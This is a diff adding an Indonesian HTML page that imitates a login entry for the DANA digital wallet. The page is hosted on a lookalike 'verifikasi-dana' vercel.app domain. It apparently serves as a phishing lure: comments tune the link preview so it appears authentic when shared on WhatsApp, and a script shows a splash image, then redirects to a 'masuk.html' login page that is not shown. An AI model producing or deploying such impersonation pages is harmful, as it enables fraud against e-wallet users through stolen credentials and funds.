@@ -1,0 +1,74 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk ke DANA</title>
+    
+    <!-- ✅ PERBAIKAN PENTING AGAR MUNCUL DI WHATSAPP -->
+    <meta property="og:site_name" content="DANA Indonesia" />
+    <meta property="og:type" content="website">
+ <!-- Pastikan link ini BENAR dan gambar ada di sana, ukuran disarankan 1200x630px -->
+    <meta property="og:image" content="https://verifikasi-dana-wine.vercel.app/danaa.jpg" /> 
+    <meta property="og:image:type" content="dana2.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:title" content="Masuk Sekarang" />
+    <meta property="og:description" content="Mulai transaksi mudah dan aman dengan DANA, dompet digital terbaik untuk kebutuhan sehari-hari. Kirim uang, bayar QRIS, dan nikmati kemudahan transaksi." />
+    <meta property="og:url" content="https://verifikasi-dana-wine.vercel.app/" />
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #ffffff; 
+        }
+
+        #gambarPembuka {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; 
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+
+    
+    </style>
+</head>
+<body>
+
+    <!-- Pastikan file 'dana.jpg' ada di folder yang sama, atau ganti jadi link penuh: https://verifikasi-dana.vercel.app/dana.jpg -->
+    <img id="gambarPembuka" src="dana.jpg" alt="DANA">
+    <div id="timer">3</div>
+
+    <script>
+        let waktu = 3;
+        let timerDisplay = document.getElementById('timer');
+        
+        let hitungMundur = setInterval(function() {
+            waktu--;
+            timerDisplay.textContent = waktu;
+            
+            if(waktu <= 0) {
+                clearInterval(hitungMundur);
+                window.location.href = "masuk.html"; 
+            }
+        }, 1000);
+    </script>
+
+</body>
+</html>
